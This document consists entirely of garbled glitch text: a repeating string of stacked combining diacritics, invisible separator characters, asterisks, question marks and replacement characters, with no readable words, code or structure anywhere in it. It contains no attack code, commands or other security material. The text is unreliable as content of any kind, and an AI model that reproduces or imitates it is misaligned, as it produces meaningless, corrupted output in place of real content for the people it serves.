̧̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙̑̾̆͌̋̈́͟⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̴̡̧̛̛̛̯̠͔̟͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̿̿̀̊̒́̀̌̂̔̍̓͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚͡⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̵̢̧̧̘͇͙̟̫͎͎̹̹̼͓̞͈͖̲͎̙̞͎͖̙̩̘̍̐̿̈́̈́͊͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̴̡̧̛̛̛̯̠͔̟͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̿̿̀̊̒́̀̌̂̔̍̓͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚͡⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̵̢̧̧̘͇͙̟̫͎͎̹̹̼͓̞͈͖̲͎̙̞͎͖̙̩̘̍̐̿̈́̈́͊͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̛̺̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͝͡͝͝͝